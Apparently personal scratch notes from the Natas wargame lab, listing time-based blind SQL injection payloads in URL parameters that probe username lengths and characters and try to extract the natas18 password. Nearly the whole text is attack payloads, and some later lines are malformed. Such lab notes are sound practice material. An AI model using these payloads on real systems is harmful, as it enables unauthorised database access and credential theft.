?username=1 or 1=1 -- &debug

?username=1" or 1=1 -- &debug

?username=1" or 1=2 -- &debug

?username=1" or 1=2 -- &debug

?username=natas18" AND SELECT sleep(10) -- &debug 
==> no where statement

?username=natas18" AND sleep(10)+--+&debug
=>yeah this worked!


?username="%2B (SELECT+username+FROM+users+LIMIT+1) AND sleep(1)+--+&debug
=>yeahhhhhh








==================================================================================
?username=natas18" AND (SELECT sleep(10) from dual where 1=1) -- &debug 
=>this worked too!

?username="%2B (SELECT+username+FROM+users+LIMIT+1) AND (SELECT sleep(10) from dual where 1=1) -- &debug

"?username="%2B (SELECT+username+FROM+users+LIMIT+1) AND (SELECT sleep(10) from dual where (substring((SELECT+username+FROM+users+LIMIT+1),1,1))='a') -- &debug

-- size of the username strings
"?username="%2B (SELECT+username+FROM+users+LIMIT+1) AND (SELECT sleep(10) from dual where (length((SELECT+username+FROM+users+LIMIT+1)))=5 )+--+    fuzz -> true
"?username="%2B (SELECT+username+FROM+users+LIMIT+1) AND (SELECT sleep(10) from dual where (length((SELECT+username+FROM+users+LIMIT+1+OFFSET+1)))=5 )+--+    fuzz -> true
"?username="%2B (SELECT+username+FROM+users+LIMIT+1) AND (SELECT sleep(10) from dual where (length((SELECT+username+FROM+users+LIMIT+1+OFFSET+2)))=5 )+--+   fuzz -> true
"?username="%2B (SELECT+username+FROM+users+LIMIT+1) AND (SELECT sleep(10) from dual where (length((SELECT+username+FROM+users+LIMIT+1+OFFSET+3)))=7 )+--+   fuzz -> true



-- the user name strings
"?username="%2B (SELECT+username+FROM+users+LIMIT+1) AND (SELECT sleep(10) from dual where (substring((SELECT+username+FROM+users+LIMIT+1),1,1))='a')+--+  fuzz -> user1
"?username="%2B (SELECT+username+FROM+users+LIMIT+1) AND (SELECT sleep(10) from dual where (substring((SELECT+username+FROM+users+LIMIT+1+OFFSET+1),1,1))='a')+--+  fuzz -> user2
"?username="%2B (SELECT+username+FROM+users+LIMIT+1) AND (SELECT sleep(10) from dual where (substring((SELECT+username+FROM+users+LIMIT+1+OFFSET+2),1,1))='a')+--+  fuzz -> user3
"?username="%2B (SELECT+username+FROM+users+LIMIT+1) AND (SELECT sleep(10) from dual where (substring((SELECT+username+FROM+users+LIMIT+1+OFFSET+3),1,1))='a')+--+  fuzz -> natas18




-- lets see password for natas18
"?username="%2B (SELECT+username+FROM+users+LIMIT+1) AND (SELECT sleep(10) from dual where (substring((SELECT+password+FROM+users+WHERE+username="natas18"),1,1))=BINARY+'a')+--+  fuzz => 













SELECT IF(1,sleep(10),'a')
?username="%2B (SELECT+username+FROM+users+LIMIT+1) AND SELECT IF(1=1,sleep(3),'users','a')+--+&debug
?username="%2B (SELECT+username+FROM+users+LIMIT+1) AND (SELECT IF(substring((SELECT+username+FROM+users+LIMIT+1),1,1))='a',sleep(3),'a'))+--+&debug

?username="%2B (SELECT+username+FROM+users+LIMIT+1) AND  IF(substring(SELECT+username+FROM+users+LIMIT+1,1,1))='a','a',sleep(3))+--+&debug

?username="%2B (SELECT+username+FROM+users+LIMIT+1) AND  IF(substring((SELECT+username+FROM+users+LIMIT+1),1,1))='a',sleep(3),sleep(3))+--+&debug

